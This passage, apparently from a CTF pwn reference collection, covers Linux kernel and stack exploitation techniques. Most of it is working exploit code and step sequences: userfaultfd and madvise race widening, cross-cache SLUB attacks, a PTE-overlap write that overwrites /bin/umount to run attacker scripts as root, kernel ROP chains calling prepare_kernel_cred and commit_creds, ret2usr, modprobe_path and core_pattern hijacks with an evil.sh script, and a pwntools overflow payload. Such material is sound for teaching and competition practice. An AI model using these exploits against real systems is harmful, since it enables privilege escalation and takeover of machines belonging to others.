ioctl(uffd, UFFDIO_REGISTER, &reg);

// Fault handler thread
void *handler(void *arg) {
    struct pollfd pfd = { .fd = uffd, .events = POLLIN };
    while (poll(&pfd, 1, -1) > 0) {
        struct uffd_msg msg;
        read(uffd, &msg, sizeof(msg));
        // >>> RACE WINDOW: kernel thread is paused <<<
        // Free target object, spray heap, etc.

        // Resolve fault to resume kernel
        struct uffdio_copy copy = {
            .dst = msg.arg.pagefault.address & ~0xFFF,
            .src = (unsigned long)src_page,
            .len = 0x1000
        };
        ioctl(uffd, UFFDIO_COPY, &copy);
    }
}
```

**Split object over two pages:** Place a kernel object so it spans a page boundary. The first page is normal; the second triggers uffd. The kernel processes the first half, then blocks on the second half -- the race window occurs mid-operation.

### Alternative Race Techniques (uffd Disabled)

When `CONFIG_USERFAULTFD` is disabled or uffd is restricted to root:

1. **Large `copy_from_user()` buffer:** Pass an enormous buffer to slow down the copy operation, widening the race window
2. **CPU pinning + heavy syscalls:** Pin racing threads to the same core; use heavy kernel functions to extend the timing window
3. **Repeated attempts:** Pure race without stabilization -- run exploit in a loop. Success rate varies (1% to 50% depending on timing)
4. **TSC-based timing (Context Conservation):** Loop checking TSC (Time Stamp Counter) before entering the critical section to confirm execution is at the beginning of its CFS timeslice -- reduces scheduler preemption during the race

---

## SLUB Allocator Internals

### Freelist Pointer Hardening

Since kernel 5.7+, free pointers in SLUB objects are placed in the **middle** of the object (word-aligned), not at offset 0:

```c
// From mm/slub.c
if (freepointer_area > sizeof(void *)) {
    s->offset = ALIGN(freepointer_area / 2, sizeof(void *));
}
```

**Impact:** Simple buffer overflows from the start of a freed chunk cannot reach the free pointer. Underflows from adjacent chunks may still work.

### Freelist Obfuscation (CONFIG_SLAB_FREELIST_HARDEN)

When enabled, free pointers are XOR-obfuscated with a per-cache random value:

```text
stored_ptr = real_ptr ^ kmem_cache->random
```

**Detection:** In GDB, find `kmem_cache_cpu` (via `$GS_BASE + kmem_cache.cpu_slab` offset), follow the `freelist` pointer, and check if the stored values look like valid kernel addresses. If not, obfuscation is active.

---

## Leak via Kernel Panic

When KASLR is disabled (or layout is known) and the kernel uses `initramfs`:

```nasm
jmp &flag   ; jump to the address of the flag file content in memory
```

The kernel panics and the panic message includes the faulting instruction bytes in the `CODE` section -- these bytes are the flag content.

**Prerequisites:** No KASLR (or full layout knowledge), `initramfs` (flag is loaded into kernel memory), RIP control.

---

## Race Window Extension via MADV_DONTNEED + mprotect (DiceCTF 2026)

**Pattern (cornelslop):** Kernel module has a TOCTOU race between check and delete paths, but the window is too narrow to hit reliably. Extend the race window from milliseconds to dozens of seconds by forcing repeated page faults during the long-running kernel operation.

**Technique:**
1. Map memory used by the kernel check operation (e.g., `sha256_va_range()` reading userland pages)
2. From a second thread, loop `MADV_DONTNEED` (drops page table entries) + `mprotect()` (toggles permissions)
3. Each fault during the kernel's hash computation forces VMA lock acquisition and page fault handling
4. The kernel operation stalls repeatedly, keeping the race window open

```c
// Thread 1: trigger the vulnerable CHECK ioctl (long-running hash)
ioctl(fd, CHECK_ENTRY, &entry);

// Thread 2: extend race window by forcing repeated faults
while (racing) {
    madvise(buf, PAGE_SIZE, MADV_DONTNEED);  // drop PTE
    mprotect(buf, PAGE_SIZE, PROT_READ);      // force fault on next access
    mprotect(buf, PAGE_SIZE, PROT_READ | PROT_WRITE);  // restore
}

// Thread 3: trigger the concurrent DEL ioctl
ioctl(fd, DEL_ENTRY, &entry);  // races with CHECK path
```

**Key insight:** `MADV_DONTNEED` drops page table entries without freeing the underlying pages. When the kernel next accesses that userland memory (e.g., during a hash computation), it faults and must re-establish the mapping. Combined with `mprotect()` toggling, this creates lock contention that extends any kernel operation touching userland pages from sub-millisecond to tens of seconds — turning impractical race conditions into reliable exploits.

---

## Cross-Cache Attack via CPU-Split Strategy (DiceCTF 2026)

**Pattern (cornelslop):** Vulnerable object is in a dedicated SLUB cache (not `kmalloc-*`), preventing standard same-cache reclaim after a double-free. Force pages out of the dedicated cache into the buddy allocator by splitting allocation and deallocation across CPUs.

**Technique:**
1. **Allocate N objects on CPU 0** — fills slab pages on CPU 0's partial list
2. **Free the same objects from CPU 1** — freed objects go to CPU 1's partial list (not CPU 0's)
3. CPU 1's partial list overflows to the **node partial list**
4. Completely empty slabs are released to the **PCP (per-CPU page) list**, then to the **buddy allocator**
5. Reallocate those pages as a different object type (e.g., page tables)

```c
// Pin allocation thread to CPU 0
cpu_set_t set;
CPU_ZERO(&set);
CPU_SET(0, &set);
sched_setaffinity(0, sizeof(set), &set);

// Allocate MAX_ENTRIES objects (fills ~3 slab pages)
for (int i = 0; i < MAX_ENTRIES; i++)
    ioctl(fd, ALLOC_ENTRY, &entries[i]);

// Pin free thread to CPU 1
CPU_SET(1, &set);
sched_setaffinity(0, sizeof(set), &set);

// Free from different CPU — objects land on CPU 1's partial list
for (int i = 0; i < MAX_ENTRIES; i++)
    ioctl(fd, FREE_ENTRY, &entries[i]);
// Empty slabs flow: CPU1 partial → node partial → PCP → buddy allocator
```

**Key insight:** SLUB allocates and frees per-CPU. When an object is freed on a different CPU than where it was allocated, it enters a different partial list. When that list overflows, empty slabs are returned to the buddy allocator — escaping the dedicated cache entirely. This enables cross-cache attacks even against custom `kmem_cache_create()` caches that are immune to standard heap spray.

---

## PTE Overlap Primitive for File Write (DiceCTF 2026)

**Pattern (cornelslop):** After reclaiming a freed page as a PTE (page table entry) page, overlap an anonymous writable mapping and a read-only file mapping so both are backed by the same physical page via corrupted PTEs.

**Technique:**
1. Trigger cross-cache double-free to get a page into the buddy allocator
2. Allocate a new anonymous mapping — kernel uses the freed page as a PTE page
3. Map a read-only file (e.g., `/bin/umount`) into the same PTE region
4. The corrupted PTE page now has entries pointing to the file's physical pages
5. Write through the anonymous (writable) mapping → modifies the file's pages directly
6. Overwrite the file's shebang/header to execute an attacker-controlled script

```c
// After cross-cache frees page into buddy allocator:

// 1. Anonymous mapping reclaims the page as PTE storage
char *anon = mmap(NULL, PAGE_SIZE * 512, PROT_READ | PROT_WRITE,
                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
// Touch pages to populate PTEs in the reclaimed page
for (int i = 0; i < 512; i++)
    anon[i * PAGE_SIZE] = 'A';

// 2. File mapping into overlapping virtual range
int file_fd = open("/bin/umount", O_RDONLY);
char *file_map = mmap(target_addr, PAGE_SIZE, PROT_READ,
                      MAP_PRIVATE | MAP_FIXED, file_fd, 0);

// 3. Write through anonymous side corrupts file content
// Overwrite ELF header / shebang with #!/tmp/pwn
memcpy(anon + offset, "#!/tmp/pwn\n", 11);

// 4. Execute the corrupted binary → runs attacker script as root
system("/bin/umount /tmp 2>/dev/null");
```

**Key insight:** PTE pages are just regular physical pages repurposed by the kernel's page table allocator. If a freed slab page is reclaimed as a PTE page, both the original (corrupted) slab entries and the new PTE entries coexist. By carefully overlapping anonymous and file-backed mappings in the same PTE page, writes to the anonymous mapping transparently modify file-backed pages — achieving arbitrary file write without any direct kernel write primitive. This bypasses all standard file permission checks since the write happens at the physical page level.



---

<!-- Source: kernel.md -->

# CTF Pwn - Linux Kernel Exploitation

## Table of Contents
- [Environment Setup and Recon](#environment-setup-and-recon)
  - [QEMU Debug Environment](#qemu-debug-environment)
  - [Extracting vmlinux](#extracting-vmlinux)
  - [Kernel Config Checks](#kernel-config-checks)
  - [FGKASLR Detection](#fgkaslr-detection)
- [Useful Kernel Structures for Heap Spray](#useful-kernel-structures-for-heap-spray)
  - [tty_struct (kmalloc-1024)](#tty_struct-kmalloc-1024)
  - [tty_file_private (kmalloc-32)](#tty_file_private-kmalloc-32)
  - [poll_list (kmalloc-32 to 1024)](#poll_list-kmalloc-32-to-1024)
  - [user_key_payload (kmalloc-32 to 1024)](#user_key_payload-kmalloc-32-to-1024)
  - [setxattr Temporary Buffer (kmalloc-32 to 1024)](#setxattr-temporary-buffer-kmalloc-32-to-1024)
  - [seq_operations (kmalloc-32)](#seq_operations-kmalloc-32)
  - [subprocess_info (kmalloc-128)](#subprocess_info-kmalloc-128)
- [Kernel Stack Overflow and Canary Leak](#kernel-stack-overflow-and-canary-leak)
- [Privilege Escalation Primitives](#privilege-escalation-primitives)
  - [ret2usr (No SMEP/SMAP)](#ret2usr-no-smepsmap)
  - [Kernel ROP with prepare_kernel_cred / commit_creds](#kernel-rop-with-prepare_kernel_cred--commit_creds)
  - [Saving and Restoring Userland State](#saving-and-restoring-userland-state)
- [modprobe_path Overwrite](#modprobe_path-overwrite)
  - [Technique Overview](#technique-overview)
  - [Bruteforce Without Leak](#bruteforce-without-leak)
  - [Checking CONFIG_STATIC_USERMODEHELPER](#checking-config_static_usermodehelper)
- [core_pattern Overwrite](#core_pattern-overwrite)
- [Kernel Heap Overflow via kmalloc Size Mismatch (PlaidCTF 2013)](#kernel-heap-overflow-via-kmalloc-size-mismatch-plaidctf-2013)
For tty_struct kROP, userfaultfd race stabilization, SLUB internals, cross-cache attacks, and DiceCTF 2026 kernel patterns, see [kernel-techniques.md](kernel-techniques.md).

For protection bypass techniques (KASLR, FGKASLR, KPTI, SMEP, SMAP), GDB debugging, initramfs workflow, and exploit templates, see [kernel-bypass.md](kernel-bypass.md).

---

## Environment Setup and Recon

### QEMU Debug Environment

Standard QEMU launch script for kernel challenge debugging:

```bash
qemu-system-x86_64 \
  -kernel ./bzImage \
  -initrd ./rootfs.cpio \
  -nographic \
  -monitor none \
  -cpu qemu64 \
  -append "console=ttyS0 nokaslr panic=1" \
  -no-reboot \
  -s \
  -m 256M
```

- `-s` enables GDB on port 1234 (`target remote :1234`)
- `-append "nokaslr"` disables KASLR for debugging
- Check QEMU script for: `smep`, `smap`, `kaslr`, `oops=panic`, `kpti=1`
- If `oops=panic` is absent, kernel oops only kills the faulting process (exploitable for info leaks via dmesg)

**Disable mitigations for initial debugging** by modifying the launch script:
```bash
-append "console=ttyS0 nokaslr nopti nosmep nosmap quiet panic=1"
-cpu kvm64   # instead of kvm64,+smep,+smap
```

### Extracting vmlinux

**Extract vmlinux from bzImage:**
```bash
# Use extract-vmlinux.sh from Linux kernel source (scripts/extract-vmlinux)
./extract-vmlinux ./bzImage > vmlinux

# Extract ROP gadgets
ROPgadget --binary ./vmlinux > gadgets.txt
```

### Kernel Config Checks

| Config | Effect | How to Check |
|--------|--------|-------------|
| SMEP/SMAP/KASLR/KPTI | CPU-level mitigations | Check QEMU run script `-cpu` and `-append` flags |
| FGKASLR | Per-function randomization | `readelf -S vmlinux` section count (see below) |
| `SLAB_FREELIST_RANDOM` | Randomized freelist order | Sequential allocations not adjacent |
| `SLAB_FREELIST_HARDEN` | XOR-obfuscated free pointers | Check freelist pointers in GDB |
| `STATIC_USERMODEHELPER` | Blocks `modprobe_path` overwrite | Disassemble `call_usermodehelper_setup` |
| `KALLSYMS_ALL` | `.data` symbols in `/proc/kallsyms` | `grep modprobe_path /proc/kallsyms` |
| `CONFIG_USERFAULTFD` | Enables userfaultfd syscall | Try calling it; disabled = -ENOSYS |
| eBPF JIT | JIT-compiled BPF filters | `cat /proc/sys/net/core/bpf_jit_enable` (0=off, 1=on, 2=debug) |

Check oops behavior:
- `oops=panic` in QEMU `-append` -> oops causes full kernel panic
- Without it -> oops kills the faulting process only; dmesg may leak stack/heap/kbase pointers

### FGKASLR Detection

Fine-Grained KASLR randomizes each function independently. Detect by counting ELF sections:

```bash
readelf -S vmlinux | tail -5
# FGKASLR disabled: ~30 sections
# FGKASLR enabled:  36000+ sections (one per function)

file vmlinux
# FGKASLR enabled: "too many section (36140)"
```

---

## Useful Kernel Structures for Heap Spray

These structures are allocated from standard `kmalloc` caches and controlled from userspace. Use them to fill freed slots for UAF exploitation or to leak kernel pointers.

| Structure | Cache | Alloc Trigger | Free Trigger | Use |
|-----------|-------|---------------|--------------|-----|
| `tty_struct` | kmalloc-1024 | `open("/dev/ptmx")` | `close(fd)` | kbase leak, RIP hijack |
| `tty_file_private` | kmalloc-32 | `open("/dev/ptmx")` | `close(fd)` | kheap leak (points to `tty_struct`) |
| `poll_list` | kmalloc-32~1024 | `poll(fds, nfds, timeout)` | `poll()` returns | kheap leak, arbitrary free |
| `user_key_payload` | kmalloc-32~1024 | `add_key()` | `keyctl_revoke()`+GC | arbitrary value write |
| `setxattr` buffer | kmalloc-32~1024 | `setxattr()` | same call path | momentary arbitrary value write |
| `seq_operations` | kmalloc-32 | `open("/proc/self/stat")` | `close(fd)` | kbase leak, RIP hijack |
| `subprocess_info` | kmalloc-128 | internal kernel | internal kernel | kbase leak, RIP hijack |

### tty_struct (kmalloc-1024)

Allocated when `open("/dev/ptmx")`, freed on `close()`. Size: 0x2B8 bytes.

```c
struct tty_struct {
    int magic;                    // +0x00: must be 0x5401 (paranoia check)
    struct kref kref;             // +0x04: reference count
    struct device *dev;           // +0x08
    struct tty_driver *driver;    // +0x10: must be valid kheap pointer
    const struct tty_operations *ops; // +0x18: vtable pointer -> kbase leak
    // ...
};
```

- **kbase leak:** Read `tty_struct.ops` -- points to `ptm_unix98_ops` (or similar) in kernel `.data`
- **RIP hijack:** Overwrite `tty_struct.ops` with pointer to fake vtable, then `ioctl()` calls `tty->ops->ioctl()`
- **magic** must remain `0x5401` or `tty_ioctl()` returns immediately (paranoia check)
- **driver** must be a valid kernel heap pointer or the kernel will oops

### tty_file_private (kmalloc-32)

Allocated alongside `tty_struct` in `tty_alloc_file()`. Size: 0x20 bytes.

```c
struct tty_file_private {
    struct tty_struct *tty;   // +0x00: pointer to tty_struct in kmalloc-1024
    struct file *file;        // +0x08
    struct list_head list;    // +0x10
};
```

- **kheap leak:** Read `tty_file_private.tty` to get address in `kmalloc-1024`

### poll_list (kmalloc-32 to 1024)

Allocated during `poll()`, freed when `poll()` completes (timer expiry or event trigger). Cache size depends on number of fds polled.

```c
struct poll_list {
    struct poll_list *next;   // +0x00: linked list pointer
    int len;                  // +0x08: number of entries
    struct pollfd entries[];  // +0x0C: variable-length array
};
```

- **Arbitrary free:** Overwrite `poll_list.next` -> when `poll()` finishes, it frees all entries in the linked list including the corrupted pointer -> UAF on arbitrary address

### user_key_payload (kmalloc-32 to 1024)

Allocated via `add_key()` syscall. Cache size depends on `data` length.

```c
struct user_key_payload {
    struct callback_head rcu;     // +0x00: 16 bytes, untouched until init
    unsigned short datalen;       // +0x10
    char data[];                  // +0x18: user-controlled content
};
```

- First 16 bytes are uninitialized until GC callback -- combine with UAF to leak residual heap data
- Free requires `keyctl_revoke()` then wait for GC
- Blocked by default Docker seccomp profile

### setxattr Temporary Buffer (kmalloc-32 to 1024)

`setxattr("file", "user.x", data, size, XATTR_CREATE)` allocates a buffer, copies user data, then frees it in the same call path.

- **Momentary write:** Combine with uninitialized structs to write arbitrary values into freed chunks
- Cannot be used for persistent spray (freed immediately)
- The file passed to `setxattr()` must exist -- common pitfall when exploit runs from different directory than expected

### seq_operations (kmalloc-32)

Allocated when opening `/proc/self/stat` (or similar seq_file). Contains function pointers for kbase leak.

### subprocess_info (kmalloc-128)

Internal kernel struct with function pointers. Useful for kbase leak and RIP hijack in specific scenarios.

---

## Kernel Stack Overflow and Canary Leak

Kernel modules with vulnerable read/write handlers often allow stack buffer overflow. The exploitation pattern mirrors userland stack overflows but with kernel-specific register state management.

**Canary leak via oversized read (hxp CTF 2020):**

A vulnerable `hackme_read()` copies from a 32-element stack array `tmp[32]` but allows reading up to 0x1000 bytes -- leaking the stack canary and kernel text pointers beyond the buffer.

```c
unsigned long leak[40];
int fd = open("/dev/hackme", O_RDWR);

// Read beyond stack buffer to leak canary + kernel pointers
read(fd, leak, sizeof(leak));

// Stack layout: tmp[32] at rbp-0x98, canary at rbp-0x18
// Canary at index 16 (offset 0x80 from buffer start)
unsigned long cookie = leak[16];

// Kernel text pointer at index 38 -> compute KASLR base
unsigned long kernel_base = (leak[38] & 0xffffffffffff0000);
long kaslr_offset = kernel_base - 0xffffffff81000000;
```

**Stack overflow payload structure:**

```c
unsigned long payload[50];
int off = 16;                    // offset to canary position
payload[off++] = cookie;         // canary
payload[off++] = 0x0;            // padding (rbx)
payload[off++] = 0x0;            // padding (r12)
payload[off++] = 0x0;            // saved rbp
payload[off++] = rop_start;      // return address -> ROP chain
// ... ROP chain follows ...
write(fd, payload, sizeof(payload));
```

**ioctl-based size check bypass (K3RN3LCTF 2021):**

Some modules gate write length against a global `MaxBuffer` variable that is itself controllable via `ioctl()`:

```c
// Vulnerable pattern in module:
// swrite() checks: if (MaxBuffer < user_size) return -EFAULT;
// sioctl() with cmd 0x20: MaxBuffer = (int)arg;  <- attacker-controlled

// Exploit: increase MaxBuffer before overflow
int fd = open("/proc/pwn_device", O_RDWR);
ioctl(fd, 0x20, 300);            // set MaxBuffer to 300 (buffer is only 128)
write(fd, overflow_payload, 300); // now passes size check -> stack overflow
```

**Key insight:** Kernel stack canaries work identically to userland canaries. A vulnerable read handler that copies more bytes than the buffer size leaks the canary and saved registers, including kernel text pointers for KASLR bypass. Look for `ioctl` handlers that modify global variables used in bounds checks -- they often bypass write size restrictions.

---

## Privilege Escalation Primitives

### ret2usr (No SMEP/SMAP)

When SMEP and SMAP are disabled, the kernel can directly execute userland code and access userland memory. Hijack RIP to a userland function that calls `prepare_kernel_cred(0)` and `commit_creds()`.

```c
// Addresses from /proc/kallsyms (or leak)
unsigned long prepare_kernel_cred = 0xffffffff814c67f0;
unsigned long commit_creds       = 0xffffffff814c6410;

// Saved userland state for iretq return
unsigned long user_cs, user_ss, user_sp, user_rflags, user_rip;

void privesc() {
    __asm__(".intel_syntax noprefix;"
        "movabs rax, %[prepare_kernel_cred];"
        "xor rdi, rdi;"        // prepare_kernel_cred(NULL) -> init cred
        "call rax;"
        "mov rdi, rax;"        // commit_creds(new_cred)
        "movabs rax, %[commit_creds];"
        "call rax;"
        "swapgs;"              // restore GS base for userland
        "mov r15, %[user_ss];   push r15;"
        "mov r15, %[user_sp];   push r15;"
        "mov r15, %[user_rflags]; push r15;"
        "mov r15, %[user_cs];   push r15;"
        "mov r15, %[user_rip];  push r15;"
        "iretq;"               // return to userland as root
        ".att_syntax;"
        : : [prepare_kernel_cred] "r"(prepare_kernel_cred),
            [commit_creds] "r"(commit_creds),
            [user_ss] "r"(user_ss), [user_sp] "r"(user_sp),
            [user_rflags] "r"(user_rflags),
            [user_cs] "r"(user_cs), [user_rip] "r"(user_rip));
}
```

After `privesc()` returns to userland, the process has root credentials. Call `system("/bin/sh")` to get a root shell.

### Kernel ROP with prepare_kernel_cred / commit_creds

When SMEP is enabled, build a kernel ROP chain to call `prepare_kernel_cred(0)` -> pass result to `commit_creds()` -> return to userland.

```c
// Find gadgets: ropr --no-uniq -R "^pop rdi; ret;|^mov rdi, rax" ./vmlinux
unsigned long pop_rdi_ret = 0xffffffff81006370;
unsigned long mov_rdi_rax_pop1_ret = 0xffffffff816bf740; // mov rdi, rax; ...; pop rbx; ret
unsigned long swapgs_pop1_ret = 0xffffffff8100a55f;      // swapgs; pop rbp; ret
unsigned long iretq = 0xffffffff8100c0d9;

unsigned long payload[50];
int off = 16;   // canary offset
payload[off++] = cookie;
payload[off++] = 0;           // rbx
payload[off++] = 0;           // r12
payload[off++] = 0;           // rbp

// ROP chain: prepare_kernel_cred(0) -> commit_creds(result)
payload[off++] = pop_rdi_ret;
payload[off++] = 0x0;                      // rdi = NULL
payload[off++] = prepare_kernel_cred;
payload[off++] = mov_rdi_rax_pop1_ret;     // rdi = rax (new cred)
payload[off++] = 0x0;                      // pop rbx padding
payload[off++] = commit_creds;

// Return to userland
payload[off++] = swapgs_pop1_ret;
payload[off++] = 0x0;                      // pop rbp padding
payload[off++] = iretq;
payload[off++] = user_rip;                 // spawn_shell
payload[off++] = user_cs;                  // 0x33
payload[off++] = user_rflags;
payload[off++] = user_sp;
payload[off++] = user_ss;                  // 0x2b
```

**Critical gadget: `mov rdi, rax`** -- needed to pass the return value of `prepare_kernel_cred()` (in RAX) to `commit_creds()` (expects argument in RDI). Search for variants like `mov rdi, rax; ... ; ret` that may clobber other registers.

**Tool:** `ropr` is faster than ROPgadget for large kernel images:
```bash
ropr --no-uniq -R "^pop rdi; ret;|^mov rdi, rax|^swapgs|^iretq" ./vmlinux
```

### Saving and Restoring Userland State

Before triggering the kernel exploit, save userland register state for the `iretq` return:

```c
unsigned long user_cs, user_ss, user_sp, user_rflags, user_rip;

void save_userland_state() {
    __asm__(".intel_syntax noprefix;"
        "mov %[cs], cs;"
        "mov %[ss], ss;"
        "mov %[sp], rsp;"
        "pushf; pop %[rflags];"
        ".att_syntax;"
        : [cs] "=r"(user_cs), [ss] "=r"(user_ss),
          [sp] "=r"(user_sp), [rflags] "=r"(user_rflags));
    user_rip = (unsigned long)spawn_shell;  // function to call after return
}

void spawn_shell() {
    if (getuid() == 0) {
        printf("[+] root!\n");
        system("/bin/sh");
    } else {
        printf("[-] privesc failed\n");
        exit(1);
    }
}
```

**Register values (x86_64 userland):**
- `CS` = 0x33 (64-bit user code segment)
- `SS` = 0x2b (64-bit user stack segment)
- `RSP` = current userland stack pointer
- `RFLAGS` = current flags register
- `RIP` = address of post-exploit function (e.g., `spawn_shell`)

---

## modprobe_path Overwrite

### Technique Overview

Overwrite the global `modprobe_path` variable (default: `"/sbin/modprobe"`) with a path to an attacker-controlled script. When the kernel encounters a binary with an unknown format, it executes `modprobe_path` as root.

**Requirements:**
1. Arbitrary Address Write (AAW) to overwrite `modprobe_path`
2. Ability to create two files: a malformed binary and an evil script
3. `CONFIG_STATIC_USERMODEHELPER` is disabled

**Steps:**

```bash
# 1. Write evil script
echo '#!/bin/sh' > /tmp/evil.sh
echo 'cat /flag > /tmp/output' >> /tmp/evil.sh
echo 'chmod 777 /tmp/output' >> /tmp/evil.sh
chmod +x /tmp/evil.sh

# 2. Overwrite modprobe_path with "/tmp/evil.sh" using your AAW primitive

# 3. Create and execute a malformed binary (non-printable first 4 bytes)
echo -ne '\xff\xff\xff\xff' > /tmp/trigger
chmod +x /tmp/trigger
/tmp/trigger

# 4. Read the flag
cat /tmp/output
```

**How it works:** `execve()` -> `search_binary_handler()` -> no format matches -> `request_module("binfmt-XXXX")` -> `call_modprobe()` -> executes `modprobe_path` as root.

**Key insight:** The first 4 bytes of the trigger binary must be non-printable (not ASCII without tab/newline). If they are printable, the kernel skips the `request_module()` call.

### Bruteforce Without Leak

`modprobe_path` has only 1 byte of entropy under KASLR (the randomized page offset). With AAW, brute-force the address:

```python
# modprobe_path base address (from debugging without KASLR)
MODPROBE_BASE = 0xffffffff8265ff00
# Under KASLR, only the 0x65 byte varies
# Try 256 offsets
for byte_guess in range(256):
    addr = (MODPROBE_BASE & ~0xFF0000) | (byte_guess << 16)
    write_string(addr, "/tmp/evil.sh")
    trigger_modprobe()
```

### Checking CONFIG_STATIC_USERMODEHELPER

If enabled, `call_usermodehelper_setup()` ignores `modprobe_path` and uses a hardcoded constant.

**Detection via disassembly:**

```bash
# 1. Get function address
cat /proc/kallsyms | grep call_usermodehelper_setup

# 2. Set GDB breakpoint and trigger
echo -ne '\xff\xff\xff\xff' > /tmp/nirugiri && chmod +x /tmp/nirugiri && /tmp/nirugiri

# 3. In GDB, disassemble and check:
# NOT set: rdi saved into r14 at +9, used at +127 -> modprobe_path passed through
# SET: immediate constant at +122 instead of r14 -> 1st arg (modprobe_path) ignored
```

**When set:** `sub_info->path = CONFIG_STATIC_USERMODEHELPER_PATH` (constant). Overwriting `modprobe_path` has no effect. Look for alternative LPE techniques.

---

## core_pattern Overwrite

Alternative to `modprobe_path`. Overwrite `/proc/sys/kernel/core_pattern` (or the internal `core_pattern` variable) with a pipe command. When a process crashes, the kernel executes the specified command as root to handle the core dump.

```bash
# core_pattern with pipe: first char '|' means execute as command
# Overwrite core_pattern to: "|/tmp/evil.sh"
# Then crash a process to trigger
```

**Finding the offset:** `core_pattern` is not exported via `/proc/kallsyms` without `CONFIG_KALLSYMS_ALL`. To find it:

1. Set breakpoint on `override_creds()` (called by `do_coredump()`)
2. Crash a process: `int main() { ((void(*)())0)(); }`
3. After `override_creds` returns, disassemble -- look for `movzx` loading from a data address
4. That address is `core_pattern`

```text
(gdb) finish
(gdb) x/5i $rip
=> 0xffffffff811b1e98:  movzx r13d, BYTE PTR [rip+0xcfec80]  # 0xffffffff81eb0b20
(gdb) x/s 0xffffffff81eb0b20
0xffffffff81eb0b20: "core"
```

---

## Kernel Heap Overflow via kmalloc Size Mismatch (PlaidCTF 2013)

**Pattern:** Kernel module allocates `kmalloc(content_length)` but copies `0x40 + content_length` bytes (header + body), causing a 0x40-byte heap overflow into adjacent slab objects.

```c
// Vulnerable pattern in kernel HTTP handler:
buf = kmalloc(content_length, GFP_KERNEL);
memcpy(buf, http_header, 0x40);           // 0x40 bytes of header
memcpy(buf + 0x40, body, content_length); // Overflow!
```

**Exploitation:**
1. **Slab spray:** Open 1021 file descriptors (`open("/dev/kmalloc_target")`) to fill the kmalloc-256 slab cache
2. **Create holes:** Close 3 files to create gaps in the slab for the overflowing allocation
3. **Trigger overflow:** Send HTTP request with body that overflows into adjacent `struct file`
4. **Corrupt `f_op`:** Overwrite the `f_op` (file operations) pointer in the adjacent `struct file` to redirect function pointers
5. **Hijack write handler:** `f_op->write` now points to attacker-controlled address → `commit_creds(prepare_kernel_cred(0))`

**Key insight:** `struct file` is in kmalloc-256 and contains `f_op` (function pointer table). Corrupting `f_op` to a fake vtable gives control over any file operation (`read`, `write`, `ioctl`). The attacker triggers the hijacked operation via the corrupted file descriptor.



---

<!-- Source: overflow-basics.md -->

# CTF Pwn - Overflow Basics

## Table of Contents
- [Stack Buffer Overflow](#stack-buffer-overflow)
  - [ret2win with Parameter (Magic Value Check)](#ret2win-with-parameter-magic-value-check)
  - [Stack Alignment (16-byte Requirement)](#stack-alignment-16-byte-requirement)
  - [Offset Calculation from Disassembly](#offset-calculation-from-disassembly)
  - [Input Filtering (memmem checks)](#input-filtering-memmem-checks)
  - [Finding Gadgets](#finding-gadgets)
  - [Hidden Gadgets in CMP Immediates](#hidden-gadgets-in-cmp-immediates)
- [Struct Pointer Overwrite (Heap Menu Challenges)](#struct-pointer-overwrite-heap-menu-challenges)
- [Signed Integer Bypass (Negative Quantity)](#signed-integer-bypass-negative-quantity)
- [Canary-Aware Partial Overflow](#canary-aware-partial-overflow)
- [OOB Read via Stride/Rate Leak (DiceCTF 2026)](#oob-read-via-striderate-leak-dicectf-2026)
- [Stack Canary Byte-by-Byte Brute Force on Forking Servers](#stack-canary-byte-by-byte-brute-force-on-forking-servers)
- [Global Buffer Overflow (CSV Injection)](#global-buffer-overflow-csv-injection)

---

## Stack Buffer Overflow

1. Find offset to return address: `cyclic 200` then `cyclic -l <value>`
2. Check protections: `checksec --file=binary`
3. No PIE + No canary = direct ROP
4. Canary leak via format string or partial overwrite

### ret2win with Parameter (Magic Value Check)

**Pattern:** Win function checks argument against magic value before printing flag.

```c
// Common pattern in disassembly
void win(long arg) {
    if (arg == 0x1337c0decafebeef) {  // Magic check
        // Open and print flag
    }
}
```

**Exploitation (x86-64):**
```python
from pwn import *

# Find gadgets
pop_rdi_ret = 0x40150b   # pop rdi; ret
ret = 0x40101a           # ret (for stack alignment)
win_func = 0x4013ac
magic = 0x1337c0decafebeef

offset = 112 + 8  # = 120 bytes to reach return address

payload = b"A" * offset
payload += p64(ret)        # Stack alignment (Ubuntu/glibc requires 16-byte)
payload += p64(pop_rdi_ret)
payload += p64(magic)
payload += p64(win_func)
```

**Finding the win function:**
- Search for `fopen("flag.txt")` or similar in Ghidra
- Look for functions with no XREF that check a magic parameter
- Check for conditional print/exit patterns after parameter comparison

### Stack Alignment (16-byte Requirement)

Modern Ubuntu/glibc requires 16-byte stack alignment before `call` instructions. Symptoms of misalignment:
- SIGSEGV in `movaps` instruction (SSE requires alignment)
- Crash inside libc functions (printf, system, etc.)

**Fix:** Add extra `ret` gadget before your ROP chain:
```python
payload = b"A" * offset
payload += p64(ret)        # Align stack to 16 bytes
payload += p64(pop_rdi_ret)
# ... rest of chain
```

### Offset Calculation from Disassembly

```asm
push   %rbp
mov    %rsp,%rbp
sub    $0x70,%rsp        ; Stack frame = 0x70 (112) bytes
...
lea    -0x70(%rbp),%rax  ; Buffer at rbp-0x70
mov    $0xf0,%edx        ; read() size = 240 (overflow!)
```

**Calculate offset:**
- Buffer starts at `rbp - buffer_offset` (e.g., rbp-0x70)
- Saved RBP is at `rbp` (0 offset from buffer end)
- Return address is at `rbp + 8`
- **Total offset = buffer_offset + 8** = 112 + 8 = 120 bytes

### Input Filtering (memmem checks)

Some challenges filter input using `memmem()` to block certain strings:
```python
payload = b"A" * 120 + p64(gadget) + p64(value)
assert b"badge" not in payload and b"token" not in payload
```

### Finding Gadgets

```bash
# Find pop rdi; ret
objdump -d binary | grep -B1 "pop.*rdi"
ROPgadget --binary binary | grep "pop rdi"

# Find simple ret (for alignment)
objdump -d binary | grep -E "^\s+[0-9a-f]+:\s+c3\s+ret"
```

### Hidden Gadgets in CMP Immediates

CMP instructions with large immediates encode useful byte sequences. pwntools `ROP()` finds these automatically:

```asm
# Example: cmpl $0xc35e415f, -0x4(%rbp)
# Bytes: 81 7d fc 5f 41 5e c3
#                  ^^ ^^ ^^ ^^
# At +3: 5f 41 5e c3 = pop rdi; pop r14; ret
# At +4: 41 5e c3    = pop r14; ret
# At +5: 5e c3       = pop rsi; ret
```

**When to look:** Small binaries with few functions often lack standard gadgets. Check `cmp`, `mov`, and `test` instructions with large immediates -- their operand bytes may decode as useful gadgets.

```python
rop = ROP(elf)
# pwntools finds these automatically
for addr, gadget in rop.gadgets.items():
    print(hex(addr), gadget)
```

## Struct Pointer Overwrite (Heap Menu Challenges)

